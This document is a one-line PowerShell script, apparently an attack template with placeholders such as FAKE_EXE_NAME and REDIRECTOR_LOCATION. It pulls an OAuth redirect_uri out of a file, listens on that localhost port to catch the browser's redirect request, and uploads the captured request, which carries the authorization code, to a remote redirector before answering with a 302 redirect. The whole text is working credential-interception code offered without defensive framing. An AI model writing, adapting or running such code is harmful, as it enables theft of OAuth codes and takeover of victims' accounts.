$fileContent = Get-Content -Path "FAKE_EXE_NAME" -Raw;if ($fileContent -match 'var\s+recD\s*=\s*"([^"]+)"') {    $urlString = $matches[1];} else {    Write-Error "URL variable not found in the file.";    return;};$uri = [System.Uri]::new($urlString);$queryString = $uri.Query.TrimStart('?');$queryParams = @{};foreach ($pair in $queryString -split '&') {    if ($pair -match "=") {        $parts = $pair -split '=', 2;        $key = $parts[0];        $value = $parts[1];        $queryParams[$key] = $value;    };};$redirectUriEncoded = $queryParams["redirect_uri"];if (-not $redirectUriEncoded) {    Write-Error "redirect_uri parameter not found.";    return;};$redirectUriDecoded = [System.Uri]::UnescapeDataString($redirectUriEncoded);$redirectUriObj = [System.Uri]::new($redirectUriDecoded);$port = $redirectUriObj.Port;$localAddress = [System.Net.IPAddress]::Parse("127.0.0.1");$listener = [System.Net.Sockets.TcpListener]::new($localAddress, $port);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();$reader = New-Object System.IO.StreamReader($stream);$writer = New-Object System.IO.StreamWriter($stream);$requestData = "";while (($line = $reader.ReadLine()) -ne $null) {    Write-Host $line;    $requestData += $line + "`r`n";    if ($line -eq "") { break } };$webClient = New-Object System.Net.WebClient;$requestData = ConvertTo-Json -InputObject $requestData;$response = $webClient.UploadString("REDIRECTOR_LOCATION", "POST", $requestData);$writer.WriteLine("HTTP/1.1 302 Found");$writer.WriteLine("Location: 302_REDIRECT");$writer.WriteLine("Content-Length: 0");$writer.WriteLine();$writer.Flush();$reader.Close();$writer.Close();$client.Close();$listener.Stop()